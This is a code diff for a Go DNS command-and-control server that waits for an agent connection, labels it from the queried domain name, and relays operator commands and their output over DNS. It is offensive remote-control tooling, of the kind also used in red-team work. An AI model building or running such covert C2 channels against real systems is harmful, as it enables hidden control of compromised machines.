@@ -13,6 +13,7 @@ import (
 var cmd string = ""
 var joinBuffer []string
 var outputBuffer string
+var connection string
 
 func resetState() {
 	cmd = ""
@@ -31,32 +32,36 @@ func main() {
 		defer server.Listener.Close()
 	}()
 
+	fmt.Print("\nWaiting for a connection...")
+	dns.HandleFunc(".", AgentHandler)
 	for {
-		fmt.Print("\ndnsc2> ")
-		scanner := bufio.NewScanner(os.Stdin)
-		if scanner.Scan() {
-			cmd = scanner.Text()
-			if cmd == " " {
-				continue
+		if connection != "" {
+			fmt.Printf("\n[%s] dnsc2> ", connection)
+			scanner := bufio.NewScanner(os.Stdin)
+			if scanner.Scan() {
+				cmd = scanner.Text()
+				if cmd == " " {
+					continue
+				}
 			}
-		}
 
-		dns.HandleFunc(".", AgentHandler)
+			dns.HandleFunc(".", AgentHandler)
 
-		// Wait for full reply
-		for cmd != "" {
-			if cmd == "" {
-				break
+			for cmd != "" {
+				if cmd == "" {
+					break
+				}
 			}
-		}
 
-		fmt.Println(outputBuffer)
+			fmt.Println(outputBuffer)
+		}
 	}
 }
 
 func AgentHandler(w dns.ResponseWriter, req *dns.Msg) {
 	urlConstr := req.Question[0].Name
 	deconUrl := strings.Split(urlConstr, ".")
+	connection = deconUrl[1]
 
 	dnsMessage := new(dns.Msg)
 	dnsMessage.SetReply(req)
